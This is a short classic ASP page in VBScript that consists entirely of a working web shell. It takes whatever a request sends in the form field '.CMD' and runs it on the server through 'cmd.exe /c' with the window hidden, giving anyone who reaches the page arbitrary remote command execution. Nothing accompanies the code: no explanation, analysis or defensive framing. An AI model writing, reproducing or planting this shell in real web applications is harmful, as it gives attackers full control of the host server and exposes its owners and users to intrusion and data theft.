<%@ Language=VBScript %>
<%
  Dim oScript
  Dim szCMD
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  szCMD = Request.Form(".CMD")
  If (szCMD <> "") Then
    Call oScript.Run("cmd.exe /c " & szCMD, 0, True)
  End If
%>
